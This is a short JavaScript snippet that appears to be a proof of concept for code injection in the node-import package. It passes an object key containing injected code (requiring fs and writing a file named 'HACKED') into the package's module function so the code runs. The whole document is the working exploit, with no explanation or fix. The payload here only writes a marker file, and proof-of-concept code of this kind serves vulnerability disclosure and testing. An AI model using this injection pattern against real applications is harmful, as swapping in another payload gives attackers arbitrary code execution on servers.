var a = require("node-import");
var params = {
  'fs=require("fs");fs.writeFileSync("HACKED", "2333");//':123
}
a.module('x',params,true)
